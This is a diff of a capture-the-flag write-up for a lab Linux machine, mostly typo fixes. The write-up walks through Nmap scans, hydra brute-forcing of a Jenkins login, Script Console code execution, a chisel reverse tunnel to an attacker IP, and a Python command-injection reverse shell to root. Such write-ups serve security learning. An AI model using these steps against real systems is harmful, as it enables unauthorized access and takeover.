@@ -19,11 +19,12 @@ Machine details:
 > Rated as: Medium
 >
 > IP: 10.150.150.38
-
+>
+> Goal: Become root and capture 4 flags: FLAG69.txt, FLAG70.txt, FLAG71.txt, and FLAG72.txt.
 
 # [](#header-1)Manual OS fingerprinting.
 
-I pinged the machine, and based on the [TTL](https://subinsb.com/default-device-ttl-values/) I can conclude it's a Linux box:
+Pinging the machine and based on the [TTL](https://subinsb.com/default-device-ttl-values/) I can conclude it's a Linux box:
 
 ```bash
 
@@ -38,8 +39,8 @@ rtt min/avg/max/mdev = 162.577/162.577/162.577/0.000 ms
 
 # [](#header-1)Port scanning.
 
-I use two port scans, in the first one I discover all open ports. In the second I perform a nmap scan over those 
-discovered ports trying to discover the service versions and also try basic nmap enum scripts.
+I use two port scans, in the first one I discover all open ports. In the second I perform a scan over those 
+discovered ports trying to discover the service versions and also try basic Nmap enum scripts.
 
 ## [](#header-2)First scan.
 
@@ -60,21 +61,21 @@ Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds
 ```
 
 
-*    In the first part I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.
+*    In the first part, I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.
 *    `-p-`: Scan all TCP ports.
 *    `--min-rate=5000`: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.
 *    `-n`: Don't use DNS resolution (It goes faster this way).
-*    `-sT`: Use tcp connect scan. I prefer this rather than the default (stealth).
-*    `-Pn`: Don't do host discovery on the machine, it can save me some time, but before the scan I always test reachability to the machine.
-*    `-oG allports`: Saves the nmap output in grepable format to a file called **allports**.
+*    `-sT`: Use TCP connect scan. I prefer this rather than the default (stealth).
+*    `-Pn`: Don't do host discovery on the machine, it can save me some time. Before the scan I always test reachability to the machine.
+*    `-oG allports`: Saves the Nmap output in grepable format to a file called **allports**.
 *    `--open`: Only shows me open ports.
-*    `$IP`: This is where i call my env variable the IP of the machine.
+*    `$IP`: This is where I call my env variable the IP of the machine.
 
 
 When I'm facing some fancy bash commands that at first sight I don't clearly understand there is a very useful resource (Thanks Henry): [https://explainshell.com/](https://explainshell.com/explain?cmd=IP%3D10.150.150.38%3Bnmap+-p-+--min-rate%3D5000+-n+-sT+-Pn+-oG+allports+--open+%24IP)
 
 
-Remember I saved the output as nmap grepable format? Well that was because I use a bash function that extracts the open ports from there and place them in a bash env variable called ports. Thanks to [s4vitar](https://www.youtube.com/c/s4vitar/videos) for this:
+Remember I saved the output as nmap grepable format? Well, that was because I use a bash function that extracts the open ports from there and placed them in a bash env variable called ports. Thanks to [s4vitar](https://www.youtube.com/c/s4vitar/videos) for this:
 
 ```bash
 function extract () {
@@ -85,7 +86,7 @@ function extract () {
 
 ```
 
-After writting that function in the .zshrc file (this is my case, because I'm using zsh), and using the source command to reaload the config, this is the output:
+After writing that function in my .zshrc file and using the source command to reload the config, this is the output:
 
 
 ```bash
@@ -121,11 +122,11 @@ Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
 
 *    `-p$ports`: Only scan the ports I discovered from the previous scan.
 *    `--min-rate=1000`: Fast scan.
-*    `-sC`: Perform nmap default scripts scan.
+*    `-sC`: Perform Nmap default scripts scan.
 *    `-sV`: Do version detection.
 *    `-n`: Don't do DNS resolution.
 *    `-Pn`: Don't do host discovery.
-*    `-oN targeted`: Save the output to a file called targeted, using normal format.
+*    `-oN targeted`: Save the output to a file called targeted, using the normal format.
 *    `$IP`: This is the variable containing the IP.
 
 
@@ -147,7 +148,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-Nothing useful found here.
+Nothing useful was found here.
 
 
 # [](#header-1)Jenkins login page.
@@ -156,7 +157,7 @@ When we visit the web service on port 30609 it shows a Jenkins login page:
 
 ![](assets/jenkins_login.png)
 
-I [found](https://www.shellhacks.com/jenkins-default-password-username/) that the default jenkins username is `admin`, and after trying default easy passwords 
+I [found](https://www.shellhacks.com/jenkins-default-password-username/) that the default Jenkins username is `admin`, and after trying default easy passwords 
 unsuccessfully I moved on and try to bruteforce the login page with `hydra`.
 
 # [](#header-1)Login bruteforcing.
@@ -188,7 +189,7 @@ The creds are `admin` : `matrix`
 
 # [](#header-1)Jenkins code execution.
 
-In the Script Console we can execute java code, and we can use it to execute system commands:
+In the Script Console page we can execute Java code, and we can use it to execute system commands:
 
 ![](assets/jenkins_execution.png)
 
@@ -226,7 +227,7 @@ Which turns to be a directory. Inside it there is a `config.xml` file, and when 
 
 ![](assets/FLAG69.png)
 
-Doing some manual enumeration we discover port `8080` which wasn't showed as up in the intial nmap scan:
+Doing some manual enumeration we discover port `8080` which wasn't showed as up in the initial Nmap scan:
 
 ```bash
 jenkins@dev1:~$ netstat -antup
@@ -270,7 +271,7 @@ Setting up the chisel server on the attacking machine:
 2021/09/08 21:49:35 server: Listening on http://0.0.0.0:7171
 ```
 
-And then wer fire it up as client mode on the victim machine:
+And then we fire it up as client mode on the victim machine:
 
 ```bash
 jenkins@dev1:/tmp$ chmod +x chisel;./chisel client 10.66.69.69:7171 R:8080:127.0.0.1:8080
@@ -317,28 +318,35 @@ We found some interesting info looking at the source code:
 
 ```
 
-And whit that we got the third flag:
+And with that we got the third flag:
 
 ![](assets/FLAG71.png)
 
-# [](header-1)PrivEsc via command injection in python webapp.
+# [](header-1)PrivEsc via command injection in python web app.
 
-By the title of the web page we can conclude it is a python webapp.
+By the title of the web page we can conclude it is a python web app.
 
-Searching on the web payloads for command injection in python webapps I found this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html).
+Searching on the web payloads for command injection in python web apps I found this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html).
 
 And after trying different payloads I managed to get a reverse shell:
 
 ![](assets/rev_root.png)
 
-And we receive a root shell and with that we capture the last flag:
+And we receive a root shell and with that, we capture the last flag:
 
 ![](assets/root_shell.png)
 
 And that was it.
 
+# [](header-1)Skills used.
+
+*    Port enumeration with `Nmap`.
+*    Login form bruteforcing with `hydra`.
+*    Jenkins code execution.
+*    Port forwarding with `chisel`.
+*    Python web app command injection.
+
 # [](header-1)Final thoughts.
 
-Was not a very difficult machine, however the last part of the command injection was hard for me, I had to try different combination of payloads until I finally got the good one.
-Was a very complete machine which involved bruteforcing techniques, command execution in jenkins, port forwarding and python code injection.
-
+It was not a very difficult machine, I spent a lot of fun while doing it even though the last part of the command injection was hard for me, 
+I had to try a different combination of payloads until I finally got the good one.
